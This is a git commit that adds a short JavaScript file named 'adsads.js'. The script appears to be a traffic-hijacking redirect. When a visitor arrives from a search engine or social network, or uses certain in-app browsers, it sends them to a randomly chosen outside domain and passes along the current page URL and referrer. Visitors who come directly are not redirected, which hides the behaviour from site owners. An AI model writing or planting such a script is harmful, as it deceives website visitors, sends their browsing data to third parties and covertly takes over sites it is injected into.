32918b1f50cc43ba75134625121b3dce90948931
xerisahu <92183349+xerisahu@users.noreply.github.com>
2022-04-15 20:28:14 +0700

    Add files via upload

---
+++ adsads.js
@@ -0,0 +1,12 @@
+var ars = rChoice([
+	'https://www.soalkunci.xyz/',
+	'https://worldrecipes.eu.org/',
+	'https://ngeblog.eu.org/',
+	]);
+
+function rChoice(arr) {
+return arr[Math.floor(arr.length * Math.random())];
+}
+
+//Code arsae client javascript
+if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'duckduckgo.', 'instagram.', 'twitter.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
